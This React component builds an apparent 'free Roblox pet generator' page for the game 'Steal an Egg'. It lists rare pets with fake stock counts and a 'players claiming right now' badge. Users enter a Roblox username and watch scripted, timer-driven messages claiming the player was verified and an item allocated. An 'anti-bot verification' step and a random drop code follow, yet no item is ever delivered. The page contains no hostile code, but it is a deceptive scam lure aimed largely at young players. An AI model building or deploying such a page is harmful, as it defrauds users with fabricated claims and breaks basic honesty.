import React, { useState } from 'react';
import { 
  ArrowLeft, 
  Sparkles, 
  User, 
  CheckCircle2, 
  ShieldCheck, 
  X, 
  Loader2 
} from 'lucide-react';

interface StealAnEggPageProps {
  onBack: () => void;
}

interface EggPetItem {
  id: string;
  name: string;
  img: string;
  rarity: 'ETERNAL' | 'DIVINE' | 'SECRET' | 'COSMIC';
  stock: string;
  isSpecialGlow?: boolean;
}

const EGG_PET_ITEMS: EggPetItem[] = [
  {
    id: 'mecha-dreadscale',
    name: 'Mecha Dreadscale',
    img: '/steal_egg/mecha_dreadscale.png',
    rarity: 'SECRET',
    stock: 'x1 in Stock',
    isSpecialGlow: true
  },
  {
    id: 'dreadscale',
    name: 'Dreadscale',
    img: '/steal_egg/dreadscale.png',
    rarity: 'SECRET',
    stock: 'x1 in Stock'
  },
  {
    id: 'mecha-krakenoid',
    name: 'Mecha Krakenoid',
    img: '/steal_egg/mecha_krakenoid.png',
    rarity: 'SECRET',
    stock: 'x1 in Stock'
  },
  {
    id: 'mecha-crocodon',
    name: 'Mecha Crocodon',
    img: '/steal_egg/mecha_crocodon.png',
    rarity: 'SECRET',
    stock: 'x1 in Stock'
  },
  {
    id: 'eternal-lunar-dragon',
    name: 'Eternal Lunar Dragon',
    img: '/steal_egg/eternal_lunar_dragon.png',
    rarity: 'ETERNAL',
    stock: 'x5 in Stock'
  },
  {
    id: 'divine-trail',
    name: 'divine trail',
    img: '/steal_egg/divine_trail.png',
    rarity: 'DIVINE',
    stock: 'x4 in Stock'
  },
  {
    id: 'secret-t-rex',
    name: 'Secret T-Rex',
    img: '/steal_egg/secret_t_rex.png',
    rarity: 'SECRET',
    stock: 'x3 in Stock'
  },
  {
    id: 'eternal-mosasaurus',
    name: 'eternal mosasaurus',
    img: '/steal_egg/eternal_mosasaurus.png',
    rarity: 'ETERNAL',
    stock: 'x2 in Stock'
  },
  {
    id: 'divine-unicorn',
    name: 'divine unicorn',
    img: '/steal_egg/divine_unicorn.png',
    rarity: 'DIVINE',
    stock: 'x1 in Stock'
  },
  {
    id: 'cosmic-dragon',
    name: 'Cosmic dragon',
    img: '/steal_egg/cosmic_dragon.png',
    rarity: 'COSMIC',
    stock: 'x1 in Stock'
  },
  {
    id: 'divine-egg',
    name: 'divine egg',
    img: '/steal_egg/divine_egg.png',
    rarity: 'DIVINE',
    stock: 'x1 in Stock'
  },
  {
    id: 'eternal-egg',
    name: 'eternal egg',
    img: '/steal_egg/eternal_egg.png',
    rarity: 'ETERNAL',
    stock: 'x1 in Stock'
  },
  {
    id: 'secret-egg',
    name: 'secret egg',
    img: '/steal_egg/secret_egg.png',
    rarity: 'SECRET',
    stock: 'x1 in Stock'
  },
  {
    id: 'angelic-treadmill',
    name: 'Angelic Treadmill',
    img: '/steal_egg/angelic_treadmill.png',
    rarity: 'SECRET',
    stock: 'x1 in Stock'
  },
  {
    id: 'kitsune',
    name: 'Kitsune',
    img: '/steal_egg/kitsune.png',
    rarity: 'SECRET',
    stock: 'x1 in Stock'
  },
  {
    id: 'nightflame',
    name: 'Nightflame',
    img: '/steal_egg/nightflame.png',
    rarity: 'SECRET',
    stock: 'x1 in Stock'
  },
  {
    id: 'nightflame-egg',
    name: 'Nightflame Egg',
    img: '/steal_egg/nightflame_egg.png',
    rarity: 'SECRET',
    stock: 'x1 in Stock'
  },
  {
    id: 'gorilla-king-egg',
    name: 'Gorilla King Egg',
    img: '/steal_egg/gorilla_king_egg.png',
    rarity: 'SECRET',
    stock: 'x1 in Stock'
  }
];

export const StealAnEggPage: React.FC<StealAnEggPageProps> = ({ onBack }) => {
  const [selectedItem, setSelectedItem] = useState<EggPetItem | null>(null);
  const [modalScreen, setModalScreen] = useState<'input' | 'scanning' | 'ready'>('input');
  const [username, setUsername] = useState('');
  const [inputError, setInputError] = useState('');
  const [scanStep, setScanStep] = useState<number>(1);
  const [scanLabel, setScanLabel] = useState('Connecting to Roblox servers...');

  const handleOpenClaim = (item: EggPetItem) => {
    setSelectedItem(item);
    setModalScreen('input');
    setUsername('');
    setInputError('');
    setScanStep(1);
  };

  const handleCloseModal = () => {
    setSelectedItem(null);
  };

  const handleStartGeneration = (e?: React.FormEvent) => {
    if (e) e.preventDefault();
    if (!username.trim()) {
      setInputError('Please enter your Roblox username');
      return;
    }
    setInputError('');
    setModalScreen('scanning');
    setScanStep(1);
    setScanLabel('Searching Roblox player database...');

    const t1 = setTimeout(() => {
      setScanStep(2);
      setScanLabel(`Player "${username}" verified. Locating nest inventory...`);
    }, 1200);

    const t2 = setTimeout(() => {
      setScanStep(3);
      setScanLabel(`Allocating rare egg drop payload for ${selectedItem?.name}...`);
    }, 2400);

    const t3 = setTimeout(() => {
      setScanStep(4);
      setScanLabel('Ready for anti-bot verification!');
      setModalScreen('ready');
    }, 3800);

    return () => {
      clearTimeout(t1);
      clearTimeout(t2);
      clearTimeout(t3);
    };
  };

  return (
    <div className="min-h-screen bg-[#07070b] text-[#f0f0f5] font-sans relative pb-16 overflow-x-hidden selection:bg-red-500/20 selection:text-red-300">
      {/* Top Bar */}
      <nav className="w-full bg-[#0c0c14]/90 backdrop-blur-md border-b border-[#1c1c2b] px-4 py-3 sticky top-0 z-40 flex items-center justify-between">
        <button
          onClick={onBack}
          className="flex items-center gap-2 px-3.5 py-1.5 rounded-xl bg-[#171724] hover:bg-[#202033] text-[#e2e2ec] text-xs font-bold transition-all cursor-pointer border border-[#2b2b3f] shadow-xs"
        >
          <ArrowLeft className="w-4 h-4" />
          <span>Back to GameHub</span>
        </button>

        <div className="flex items-center gap-2 text-xs font-bold text-red-400 bg-[#260e14] px-3 py-1 rounded-full border border-red-500/30">
          <span className="w-2 h-2 rounded-full bg-red-400 animate-ping"></span>
          <span>Steal an Egg Live Drops</span>
        </div>
      </nav>

      {/* Main Container matching screenshot */}
      <main className="max-w-[1240px] mx-auto px-4 pt-6">
        {/* Top Hero matching screenshot 1 */}
        <section className="text-center py-6 px-4">
          {/* Dinosaur Logo */}
          <div className="w-28 h-28 mx-auto mb-2 flex items-center justify-center filter drop-shadow-[0_8px_24px_rgba(255,107,74,0.35)]">
            <img 
              src="/steal_egg/steal_an_egg_logo.png" 
              alt="Steal an Egg" 
              className="w-full h-full object-contain"
            />
          </div>

          {/* Heading: ALL EGGS AND PETS */}
          <h1 
            className="text-4xl md:text-5xl font-black uppercase tracking-wider drop-shadow-md bg-gradient-to-r from-[#ff6b4a] via-[#ff8452] to-[#ffaa48] bg-clip-text text-transparent"
            style={{ fontFamily: "'Fredoka', 'Rubik', sans-serif" }}
          >
            ALL EGGS AND PETS
          </h1>

          {/* Pill: Players claiming right now */}
          <div className="inline-flex items-center gap-2 bg-[#12121a]/80 backdrop-blur-md px-4 py-1.5 rounded-full mt-4 text-xs font-semibold text-[#b8b8cc] border border-white/10 shadow-inner">
            <span className="w-2 h-2 rounded-full bg-[#2ecc71] animate-pulse"></span>
            <span>Players claiming right now</span>
          </div>
        </section>

        {/* Inventory Panel Container */}
        <section className="bg-[#0f0f18]/90 rounded-2xl border border-white/10 overflow-hidden shadow-[0_12px_40px_rgba(0,0,0,0.8)] relative mt-4 mb-10">
          {/* Glowing Red Top Line matching screenshot */}
          <div className="h-[2px] w-full bg-gradient-to-r from-transparent via-[#ff3b4e] to-transparent" />

          {/* Header Title: Inventory */}
          <div className="px-6 py-4">
            <h2 
              className="text-xl font-bold text-white tracking-wide"
              style={{ fontFamily: "'Fredoka', sans-serif" }}
            >
              Inventory
            </h2>
          </div>

          {/* 4-Column Grid matching screenshot 1, 2 & 3 */}
          <div className="p-4 md:p-6 grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
            {EGG_PET_ITEMS.map((item) => (
              <div
                key={item.id}
                onClick={() => handleOpenClaim(item)}
                className={`flex flex-col bg-[#0a0a0f] hover:bg-[#14141f] rounded-2xl border transition-all duration-300 overflow-hidden group cursor-pointer ${
                  item.isSpecialGlow 
                    ? 'border-[#ffd700] shadow-[0_0_20px_rgba(255,215,0,0.35)]' 
                    : 'border-white/10 hover:border-[#ff3b4e]/70 hover:shadow-[0_8px_24px_rgba(255,59,78,0.25)] hover:-translate-y-1'
                }`}
              >
                {/* Image Container */}
                <div className="w-full aspect-[3/2] flex items-center justify-center p-3 bg-[radial-gradient(circle_at_center,rgba(255,255,255,0.06)_0%,transparent_70%)] relative overflow-hidden">
                  <img
                    src={item.img}
                    alt={item.name}
                    loading="lazy"
                    className="max-h-full max-w-full object-contain filter drop-shadow-[0_6px_12px_rgba(0,0,0,0.6)] group-hover:scale-110 transition-transform duration-300"
                  />
                </div>

                {/* Card Info */}
                <div className="p-4 flex flex-col flex-1 text-center justify-between gap-3">
                  <div>
                    <h3 
                      className="text-white font-bold text-base leading-snug tracking-wide"
                      style={{ fontFamily: "'Fredoka', sans-serif" }}
                    >
                      {item.name}
                    </h3>
                    <div className="text-xs text-[#8e8e9e] font-medium mt-1">
                      {item.stock}
                    </div>
                  </div>

                  {/* Rarity Badge */}
                  <div className="flex justify-center">
                    <span 
                      className={`text-[10px] font-bold px-3 py-0.5 rounded-full tracking-wider uppercase border ${
                        item.rarity === 'ETERNAL'
                          ? 'bg-[#00ffff]/15 text-[#00ffff] border-[#00ffff]'
                          : item.rarity === 'DIVINE'
                          ? 'bg-[#ffdf00]/15 text-[#ffdf00] border-[#ffdf00]'
                          : item.rarity === 'COSMIC'
                          ? 'bg-[#8a2be2]/15 text-[#c084fc] border-[#c084fc]'
                          : 'bg-[#ff00ff]/15 text-[#ff00ff] border-[#ff00ff]'
                      }`}
                    >
                      {item.rarity}
                    </span>
                  </div>

                  {/* Full-width Red CLAIM Button */}
                  <button
                    onClick={(e) => {
                      e.stopPropagation();
                      handleOpenClaim(item);
                    }}
                    className="w-full bg-[#ff3b4e] hover:bg-[#e62e41] active:scale-[0.98] text-white font-black py-2.5 rounded-xl text-sm tracking-wide uppercase transition-all shadow-[0_4px_14px_rgba(255,59,78,0.4)] cursor-pointer"
                  >
                    CLAIM
                  </button>
                </div>
              </div>
            ))}
          </div>
        </section>

        {/* Footer */}
        <footer className="text-center py-6 border-t border-white/10 text-xs text-[#6e6e82]">
          © 2026 Steal an Egg · All Drops & Pets Companion
        </footer>
      </main>

      {/* Claim / Unlock Item Modal */}
      {selectedItem && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4">
          {/* Backdrop */}
          <div 
            className="fixed inset-0 bg-black/85 backdrop-blur-sm transition-opacity"
            onClick={handleCloseModal}
          />

          {/* Modal Box */}
          <div className="relative z-10 bg-[#12121a] max-w-md w-full rounded-[28px] border border-[#ff3b4e]/40 p-6 shadow-[0_24px_50px_rgba(0,0,0,0.9)] max-h-[90vh] overflow-y-auto">
            {/* Header */}
            <div className="flex items-center justify-between mb-5">
              <div className="flex items-center gap-2.5">
                <img 
                  src="/steal_egg/steal_an_egg_logo.png" 
                  alt="Logo" 
                  className="w-10 h-10 object-contain"
                />
                <span className="font-extrabold text-[#f0f0f5] text-base">
                  Claim Free Item
                </span>
              </div>
              <button
                onClick={handleCloseModal}
                className="text-[#8e8e9e] hover:text-white p-1 cursor-pointer"
              >
                <X className="w-5 h-5" />
              </button>
            </div>

            {/* SCREEN 1: Enter Username */}
            {modalScreen === 'input' && (
              <div className="space-y-4">
                {/* Item Preview Card */}
                <div className="flex items-center gap-3.5 bg-[#181824] p-3 rounded-2xl border border-white/10">
                  <div className="w-14 h-14 bg-[#0a0a0f] rounded-xl p-1.5 border border-white/10 shrink-0 flex items-center justify-center">
                    <img
                      src={selectedItem.img}
                      alt={selectedItem.name}
                      className="max-h-full max-w-full object-contain"
                    />
                  </div>
                  <div>
                    <h4 className="font-bold text-white text-sm">
                      {selectedItem.name}
                    </h4>
                    <span className="inline-block bg-[#ff3b4e] text-white text-[10px] font-bold px-2 py-0.5 rounded-md mt-1 uppercase">
                      FREE DROP
                    </span>
                  </div>
                </div>

                <p className="text-xs text-[#a5a5b8] leading-relaxed">
                  Enter your Roblox username to start generating your free Steal an Egg drop.
                </p>

                {/* Username Input */}
                <form onSubmit={handleStartGeneration} className="space-y-3">
                  <div className="relative">
                    <div className="absolute inset-y-0 left-0 pl-3.5 flex items-center pointer-events-none text-red-400">
                      <User className="w-4 h-4" />
                    </div>
                    <input
                      type="text"
                      value={username}
                      onChange={(e) => {
                        setUsername(e.target.value);
                        if (inputError) setInputError('');
                      }}
                      placeholder="Your Roblox username"
                      className="w-full pl-10 pr-4 py-3 rounded-xl bg-[#0a0a0f] border-2 border-white/10 text-white placeholder:text-[#5f5f70] focus:outline-none focus:border-[#ff3b4e] text-sm font-medium"
                      maxLength={20}
                    />
                  </div>

                  {inputError && (
                    <div className="text-xs text-red-400 font-semibold text-center">
                      {inputError}
                    </div>
                  )}

                  <button
                    type="submit"
                    className="w-full bg-[#ff3b4e] hover:bg-[#e62e41] active:translate-y-0.5 text-white font-black py-3.5 px-6 rounded-xl transition-all shadow-[0_4px_14px_rgba(255,59,78,0.4)] cursor-pointer text-sm uppercase tracking-wide flex items-center justify-center gap-2"
                  >
                    <Sparkles className="w-4 h-4" />
                    <span>CLAIM NOW</span>
                  </button>
                </form>

                <div className="flex items-center justify-center gap-1.5 text-[11px] text-[#8e8e9e] pt-2">
                  <span className="w-2 h-2 rounded-full bg-emerald-400"></span>
                  <span>Secure connection · No password required</span>
                </div>
              </div>
            )}

            {/* SCREEN 2: Scanning & Processing */}
            {modalScreen === 'scanning' && (
              <div className="text-center py-4 space-y-5">
                <div className="w-16 h-16 rounded-full bg-[#201014] border-2 border-[#ff3b4e]/50 flex items-center justify-center mx-auto text-[#ff3b4e]">
                  <Loader2 className="w-8 h-8 animate-spin" />
                </div>

                <div>
                  <h4 className="font-bold text-white text-base">
                    Generating Drop
                  </h4>
                  <p className="text-xs text-[#a5a5b8] mt-1">
                    {scanLabel}
                  </p>
                </div>

                {/* Step indicators */}
                <div className="space-y-2.5 text-left bg-[#0a0a0f] p-3.5 rounded-2xl border border-white/5">
                  <div className={`flex items-center gap-2.5 text-xs font-semibold ${scanStep >= 1 ? 'text-[#ff3b4e]' : 'text-[#505060]'}`}>
                    <CheckCircle2 className="w-4 h-4 shrink-0" />
                    <span>1. Locating account "{username}"</span>
                  </div>
                  <div className={`flex items-center gap-2.5 text-xs font-semibold ${scanStep >= 2 ? 'text-[#ff3b4e]' : 'text-[#505060]'}`}>
                    <CheckCircle2 className="w-4 h-4 shrink-0" />
                    <span>2. Unlocking {selectedItem.name} voucher packet</span>
                  </div>
                  <div className={`flex items-center gap-2.5 text-xs font-semibold ${scanStep >= 3 ? 'text-[#ff3b4e]' : 'text-[#505060]'}`}>
                    <CheckCircle2 className="w-4 h-4 shrink-0" />
                    <span>3. Ingesting egg pet sync handshake</span>
                  </div>
                </div>
              </div>
            )}

            {/* SCREEN 3: Ready for final verification */}
            {modalScreen === 'ready' && (
              <div className="text-center py-2 space-y-4">
                <div className="w-16 h-16 rounded-full bg-[#201014] border-2 border-emerald-500 flex items-center justify-center mx-auto text-emerald-400">
                  <ShieldCheck className="w-9 h-9" />
                </div>

                <div>
                  <h4 className="font-black text-white text-lg">
                    Almost Done!
                  </h4>
                  <p className="text-xs text-[#a5a5b8] mt-1 leading-relaxed">
                    Your <strong>{selectedItem.name}</strong> is reserved for user <strong>{username}</strong>. Complete the quick anti-bot verification to release the pet into your game inventory!
                  </p>
                </div>

                <div className="p-3 bg-[#181824] rounded-2xl border border-white/10 text-xs text-red-300">
                  Drop Code: <strong>EGG-STEAL-{Math.floor(1000 + Math.random() * 9000)}</strong>
                </div>

                <button
                  onClick={() => {
                    alert(`Congratulations! Item "${selectedItem.name}" claimed successfully for "${username}".`);
                    handleCloseModal();
                  }}
                  className="w-full bg-[#ff3b4e] hover:bg-[#e62e41] active:translate-y-0.5 text-white font-black py-3.5 px-6 rounded-xl transition-all shadow-[0_4px_14px_rgba(255,59,78,0.4)] cursor-pointer text-sm uppercase tracking-wide flex items-center justify-center gap-2"
                >
                  <CheckCircle2 className="w-4 h-4" />
                  <span>VERIFY & UNLOCK NOW</span>
                </button>
              </div>
            )}
          </div>
        </div>
      )}
    </div>
  );
};
